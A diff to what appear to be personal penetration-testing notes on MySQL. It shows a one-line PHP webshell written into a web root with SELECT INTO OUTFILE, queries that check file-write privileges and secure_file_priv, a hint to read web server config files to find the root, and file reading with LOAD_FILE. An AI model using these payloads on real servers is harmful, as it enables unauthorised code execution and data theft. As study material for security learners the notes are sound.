@@ -48,7 +48,9 @@ sudo apt install mysql-server -y
 - View sensitive logs and error outputs that could indicate further attack possibilities
 - RCE by writing files to executable directories
 ### RCE (Writing files)
-MySQL doesn't have a way to directly execute code (unlike [[MSSQL#RCE]]), but you can write files, meaning you could write a file to an executable dir (eg. a web server root) and then execute it through the web server. If the mysql service has enough privileges, it can write using `SELECT INTO OUTFILE`.
+MySQL doesn't have a way to directly execute code (unlike [[MSSQL#RCE]]), but you can write files, meaning you could write a file to an executable dir (eg. a web server root) and then execute it through the web server. 
+
+If the mysql service has enough privileges, it can write using `SELECT INTO OUTFILE`.
 ```sql
 mysql> SELECT "<payload>" INTO OUTFILE '<path>';
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
@@ -59,12 +61,32 @@ mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html
 > - `<name of dir>` : only data import/export ops can be performed in that directory (dir must exist, server won't create it)
 > - `NULL` : disables all import/export ops
 
+We can check these permissions and variables by:
+```SQL
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+SELECT variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
+```
+```SQL
+SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]'
+```
+
+> When writing webshells, we need to know the web root dir. There are common ones such as `/var/www/html/` but we can potentially read the config at `/etc/apache2/apache2.conf` or `/etc/nginx/nginx.conf` or `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` (for IIS / [[MSSQL]])
 ### Reading Files
 If appropriate settings and privileges allow it, we can read files too
 ```sql
 mysql> SELECT LOAD_FILE("<path>");
 ```
 
+### Checking user privileges
+```sql
+SELECT super_priv FROM mysql.user
+```
+This will tell us if our user has the super admin privileges. We can see additional privileges via:
+```SQL
+SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]'
+```
+> Get user with `select user from mysql.user` or `user()`
 ## Enumeration Checklist
 
 | Goal                          | Command(s)                                                                                                                                                                                  | Refs                                                                                          |
@@ -74,6 +96,7 @@ mysql> SELECT LOAD_FILE("<path>");
 | Show information              | show databases;<br><br>use [database name];<br><br>show tables;<br><br>show columns from [table];<br><br>select \* from [table];<br><br>select \* from [table] where [column] = "[string]"; |                                                                                               |
 | Get version                   | select version();                                                                                                                                                                           |                                                                                               |
 | Linux GUI App                 | sudo dpkg -i dbeaver-<version>.deb<br><br>dbeaver &                                                                                                                                         | [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases)    |
+| User information              | select user()<br><br>select current_user()<br><br>select user from mysql.user                                                                                                               |                                                                                               |
 ### Nmap Scripts
 > always manually validate results for false positives
 - mysql*
